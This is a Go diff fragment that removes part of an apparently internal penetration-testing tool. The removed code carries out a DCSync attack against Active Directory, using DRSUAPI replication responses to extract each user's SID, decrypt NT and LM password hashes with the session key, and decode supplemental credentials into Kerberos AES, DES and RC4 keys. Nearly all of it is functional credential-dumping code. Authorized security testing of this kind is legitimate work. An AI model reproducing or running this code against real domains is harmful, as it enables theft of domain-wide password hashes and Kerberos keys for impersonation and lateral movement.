-		result.SuccessfulExtractions, result.FailedExtractions, *config.Domain)
-
-	return nil
-}
-
-// extractUserCredentials extracts credentials from DRSUAPI replication data
-func extractUserCredentials(ctx context.Context, conn dcerpc.Conn, client drsuapi.DrsuapiClient, username, domain string, resp *drsuapi.GetNCChangesResponse, config *msrpcfern.PentestMsrpcDcSyncConfig) (*msrpcfern.DcSyncUserEntry, error) {
-	log := svc1log.FromContext(ctx)
-	v6Reply, ok := resp.Out.Value.(*drsuapi.MessageGetNCChangesReply_V6)
-	if resp.OutVersion != 6 || resp.Out == nil || !ok || v6Reply.V6 == nil {
-		return nil, fmt.Errorf("unexpected response level or no data for user %s", username)
-	}
-
-	info6 := v6Reply.V6
-	if info6.ObjectsCount == 0 || info6.Objects == nil {
-		return nil, fmt.Errorf("no objects returned for user %s", username)
-	}
-
-	obj := info6.Objects
-	userEntry := &msrpcfern.DcSyncUserEntry{
-		Username:          username,
-		Domain:            domain,
-		UserPrincipalName: &[]string{fmt.Sprintf("%s@%s", username, domain)}[0],
-	}
-
-	// Extract RID from objectSid for hash decryption - process SID first
-	var userRID uint32
-
-	// Process attributes from the replication object
-	if obj.EntityInfo == nil || obj.EntityInfo.AttributeBlock == nil {
-		return nil, fmt.Errorf("no attribute data for user %s", username)
-	}
-
-	// Log all attributes for debugging
-	// Process user attributes
-
-	// FIRST PASS: Extract RID from objectSid (MUST be done before decrypting hashes)
-	for _, attr := range obj.EntityInfo.AttributeBlock.Attribute {
-		if attr.AttributeType == 0x90092 { // objectSid
-			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
-				sidBytes := attr.AttributeValue.Values[0].Value
-				log.Debug("Raw objectSid bytes",
-					svc1log.SafeParam("sidBytesHex", hex.EncodeToString(sidBytes)),
-					svc1log.SafeParam("sidLength", len(sidBytes)))
-
-				// Parse SID structure
-				var sid dtyp.SID
-				if err := ndr.Unmarshal(sidBytes, &sid, ndr.Opaque); err == nil {
-					// Extract RID from SID
-					if len(sid.SubAuthority) > 0 {
-						userRID = sid.SubAuthority[len(sid.SubAuthority)-1]
-						// Store the SID string in the user entry
-						sidStr := sid.String()
-						userEntry.ObjectSid = &sidStr
-						log.Debug("Extracted RID from parsed SID",
-							svc1log.SafeParam("rid", userRID),
-							svc1log.SafeParam("username", username),
-							svc1log.SafeParam("objectSid", sidStr),
-							svc1log.SafeParam("subAuthorityCount", len(sid.SubAuthority)))
-					} else {
-						log.Error("SID has no SubAuthority entries",
-							svc1log.SafeParam("username", username))
-					}
-				} else {
-					log.Error("Failed to parse SID",
-						svc1log.SafeParam("error", err.Error()),
-						svc1log.SafeParam("username", username))
-				}
-				break // Found SID, stop looking
-			}
-		}
-	}
-
-	// Process user attributes with extracted RID
-
-	// SECOND PASS: Process all other attributes including password hashes (now we have RID)
-	var hasUnicodePwd bool
-	for _, attr := range obj.EntityInfo.AttributeBlock.Attribute {
-		// Process each attribute
-
-		switch attr.AttributeType {
-		case 0x90092: // objectSid - already processed in first pass
-			// Skip - RID already extracted in first pass
-		case 0x9005E: // unicodePwd (NT hash)
-			hasUnicodePwd = true
-			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
-				rawNtHashBytes := attr.AttributeValue.Values[0].Value
-				// Process NT hash attribute
-
-				// Process NT hash blob
-
-
-				// Decrypt NT hash using DRSUAPI session key
-
-				// Check session key availability for hash decryption
-
-				// Decrypt hash using session key
-				decryptedHashBytes, err := drsuapi.DecryptHash(client.Conn().Context(), userRID, rawNtHashBytes)
-				if err != nil {
-					log.Error("DecryptHash failed",
-						svc1log.SafeParam("error", err.Error()),
-						svc1log.SafeParam("username", username),
-						svc1log.SafeParam("userRID", userRID),
-						svc1log.SafeParam("rawNtHashHex", hex.EncodeToString(rawNtHashBytes)))
-					// Show decryption error
-					continue
-				}
-
-				// Successfully decrypted NT hash
-
-				if err == nil {
-					// NT hash should be exactly 16 bytes (128 bits)
-					// If we get more data, take the first 16 bytes
-					var ntHashBytes []byte
-					if len(decryptedHashBytes) >= 16 {
-						ntHashBytes = decryptedHashBytes[:16]
-					} else {
-						ntHashBytes = decryptedHashBytes
-					}
-
-					decryptedHash := hex.EncodeToString(ntHashBytes)
-					userEntry.NtHash = &decryptedHash
-				}
-			} else {
-				// Handle empty unicodePwd attribute (disabled accounts)
-				emptyPasswordHash := "31d6cfe0d16ae931b73c59d7e0c089c0"
-				userEntry.NtHash = &emptyPasswordHash
-			}
-		case 0x90054: // dBCSPwd (LM hash)
-			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
-				rawLmHashBytes := attr.AttributeValue.Values[0].Value
-				// Use DRSUAPI session-based decryption for LM hash
-				decryptedLmHashBytes, err := drsuapi.DecryptHash(conn.Context(), userRID, rawLmHashBytes)
-				if err != nil {
-					log.Debug("Failed to decrypt LM hash with go-msrpc DecryptHash",
-						svc1log.SafeParam("error", err.Error()),
-						svc1log.SafeParam("username", username))
-					// Fallback to raw encrypted data
-					lmHash := hex.EncodeToString(rawLmHashBytes)
-					userEntry.LmHash = &lmHash
-				} else {
-					lmHash := hex.EncodeToString(decryptedLmHashBytes)
-					userEntry.LmHash = &lmHash
-				}
-			}
-		case 0x9005D: // ntPwdHistory - removed from schema
-			// Skip password history processing
-		case 0x9007D: // supplementalCredentials
-			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
-				rawSupplementalCredentials := attr.AttributeValue.Values[0].Value
-				// Process supplemental credentials for Kerberos keys
-
-				// Decrypt supplemental credentials using DRSUAPI session key
-				decryptedSupplementalCreds, err := drsuapi.DecryptData(client.Conn().Context(), rawSupplementalCredentials)
-				if err != nil {
-					log.Error("Failed to decrypt supplemental credentials",
-						svc1log.SafeParam("error", err.Error()),
-						svc1log.SafeParam("username", username))
-					// Continue with other attributes even if supplemental creds fail
-					continue
-				}
-
-				// Successfully decrypted supplemental credentials
-
-				// Parse Kerberos keys from decrypted supplemental credentials
-				userEntry.KerberosKeys = parseKerberosKeys(ctx, decryptedSupplementalCreds, username)
-			}
-		}
-	}
-
-	// Handle users with no password data (disabled accounts)
-	if !hasUnicodePwd {
-		emptyPasswordHash := "31d6cfe0d16ae931b73c59d7e0c089c0" // NT hash for empty password
-		userEntry.NtHash = &emptyPasswordHash
-	}
-
-	return userEntry, nil
-}
-
-// parseKerberosKeys parses Kerberos keys from supplemental credentials
-func parseKerberosKeys(ctx context.Context, data []byte, username string) []*msrpcfern.KerberosKeyEntry {
-	log := svc1log.FromContext(ctx)
-	keys := []*msrpcfern.KerberosKeyEntry{}
-
-	if len(data) == 0 {
-		return keys
-	}
-
-	// Parse USER_PROPERTIES structure
-	userProperties := samr.UserProperties{}
-	if err := ndr.Unmarshal(data, &userProperties, ndr.Opaque); err != nil {
-		log.Error("Failed to unmarshal USER_PROPERTIES structure",
-			svc1log.SafeParam("error", err.Error()),
-			svc1log.SafeParam("username", username),
-			svc1log.SafeParam("dataLength", len(data)))
-		return keys
-	}
-
-	// Successfully parsed supplemental credentials structure
-
-	// Kerberos encryption types
-	kerberosTypes := map[uint32]string{
-		1:          "des-cbc-crc",
-		3:          "des-cbc-md5",
-		17:         "aes128-cts-hmac-sha1-96",
-		18:         "aes256-cts-hmac-sha1-96",
-		0xffffff74: "rc4_hmac",
-	}
-
-	// Use map to deduplicate keys based on keyType+keyValue combination
-	keyMap := make(map[string]*msrpcfern.KerberosKeyEntry)
-
-	// Process each user property to find Kerberos credentials
-	for _, property := range userProperties.UserProperties {
-		if property == nil {
-			continue
-		}
-
-		propertyName := property.PropertyName
-		// Process user property for Kerberos credentials
-
-		// Look for Kerberos-related properties
-		switch propertyName {
-		case "Primary:Kerberos-Newer-Keys":
-			// Process modern Kerberos credentials
-
-			// Parse the property value as KerberosStoredCredentialNew
-			if property.PropertyValue != nil {
-				if kerbStoredCredNew, ok := property.PropertyValue.Value.(*samr.UserProperty_PropertyValue_KerberosStoredCredentialNew); ok {
-					creds := kerbStoredCredNew.KerberosStoredCredentialNew
-					if creds != nil {
-						// Parse modern Kerberos stored credentials
-
-						// Extract current credentials
-						for _, cred := range creds.Credentials {
-							if cred != nil {
-								keyTypeStr, exists := kerberosTypes[cred.KeyType]
-								if !exists {
-									keyTypeStr = fmt.Sprintf("unknown-0x%x", cred.KeyType)
-								}
-
-								keyValue := hex.EncodeToString(cred.KeyData)
-								keyID := keyTypeStr + ":" + keyValue
-
-								// Only add if not already present (deduplication)
-								if _, exists := keyMap[keyID]; !exists {
-									keyMap[keyID] = &msrpcfern.KerberosKeyEntry{
-										KeyType:  keyTypeStr,
-										KeyValue: keyValue,
-									}
-
-									// Extracted Kerberos key successfully
-								}
-							}
-						}
-					}
-				}
-			}
-
-		case "Primary:Kerberos":
-			// Process legacy Kerberos credentials
-
-			// Parse the property value as KerberosStoredCredential
-			if property.PropertyValue != nil {
-				if kerbStoredCred, ok := property.PropertyValue.Value.(*samr.UserProperty_PropertyValue_KerberosStoredCredential); ok {
-					creds := kerbStoredCred.KerberosStoredCredential
-					if creds != nil {
-						// Parse legacy Kerberos stored credentials
-
-						// Extract current credentials
-						for _, cred := range creds.Credentials {
-							if cred != nil {
-								keyTypeStr, exists := kerberosTypes[cred.KeyType]
-								if !exists {
-									keyTypeStr = fmt.Sprintf("unknown-0x%x", cred.KeyType)
-								}
-
-								keyValue := hex.EncodeToString(cred.KeyData)
-								keyID := keyTypeStr + ":" + keyValue
-
-								// Only add if not already present (deduplication)
-								if _, exists := keyMap[keyID]; !exists {
-									keyMap[keyID] = &msrpcfern.KerberosKeyEntry{
-										KeyType:  keyTypeStr,
-										KeyValue: keyValue,
-									}
-
-									// Extracted Kerberos key successfully
-								}
-							}
-						}
-					}
-				}
-			}
-
-		default:
-			// Skip non-Kerberos properties (NTLM, WDigest, etc.)
-		}
-	}
-
-	// Convert map back to slice
-	for _, key := range keyMap {
-		keys = append(keys, key)
-	}
-
-	// Kerberos key extraction completed
-
-	return keys
-}
-
-
-
-// min returns the minimum of two integers
-func min(a, b int) int {
-	if a < b {
-		return a
-	}
-	return b
-}
-
-
-
-
